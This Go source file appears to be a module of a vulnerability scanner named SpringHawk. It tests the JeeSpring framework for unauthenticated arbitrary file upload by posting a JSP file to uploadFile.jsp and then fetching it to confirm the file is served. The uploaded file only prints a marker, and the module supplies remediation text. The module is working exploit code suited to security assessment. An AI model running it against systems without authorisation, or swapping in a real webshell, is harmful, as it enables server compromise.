package cve

// JeeSpring 2023: Arbitrary File Upload via /static/uploadify/uploadFile.jsp
// Allows uploading JSP webshells directly to the server

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&JeeSpringUpload{}) }

type JeeSpringUpload struct{}

func (m *JeeSpringUpload) ID() string          { return "jeespring-2023-file-upload" }
func (m *JeeSpringUpload) Name() string        { return "JeeSpring 2023 Arbitrary File Upload RCE" }
func (m *JeeSpringUpload) CVSS() float64       { return 9.8 }
func (m *JeeSpringUpload) Severity() models.Severity { return models.SeverityCritical }
func (m *JeeSpringUpload) Tags() []string      { return []string{"rce", "file-upload", "jeespring", "webshell"} }
func (m *JeeSpringUpload) Requirements() vulns.ModuleRequirements { return vulns.ModuleRequirements{} }
func (m *JeeSpringUpload) Description() string {
	return "JeeSpring framework exposes an unauthenticated file upload endpoint that allows uploading JSP webshells."
}

func (m *JeeSpringUpload) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	uploadURL := utils.JoinURL(target.BaseURL, "static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/")
	boundary := "----WebKitFormBoundarycdUKYcs7WlAxx9UL"
	shellName := fmt.Sprintf("hawk_%d.jsp", rand.Intn(9999))

	// Probe JSP (just prints a marker, not a full shell)
	jspContent := `<%out.println("SpringHawk-Upload-OK");%>`

	body := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n",
		boundary, shellName, jspContent, boundary)

	resp, err := client.Post(ctx, uploadURL,
		"multipart/form-data;boundary="+boundary,
		strings.NewReader(body), nil)
	if err != nil || resp.StatusCode != 200 {
		return nil, nil
	}
	if !strings.Contains(resp.BodyString, "jsp") && !strings.Contains(resp.BodyString, shellName) {
		return nil, nil
	}

	// Verify upload
	checkURL := utils.JoinURL(target.BaseURL, "static/uploadify/"+shellName)
	verResp, err := client.Get(ctx, checkURL, nil)
	if err != nil || verResp.StatusCode != 200 {
		return nil, nil
	}

	f := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		Title:       "JeeSpring: Unauthenticated Arbitrary File Upload (JSP WebShell)",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/static/uploadify/uploadFile.jsp",
		Method:      "POST",
		Evidence:    fmt.Sprintf("JSP file uploaded and confirmed at %s", checkURL),
		Remediation: "Remove or restrict the uploadFile.jsp endpoint. Add authentication and file type validation.",
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
		ExtraData:   map[string]string{"shell_url": checkURL},
	}
	return []*models.Finding{f}, nil
}

func (m *JeeSpringUpload) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
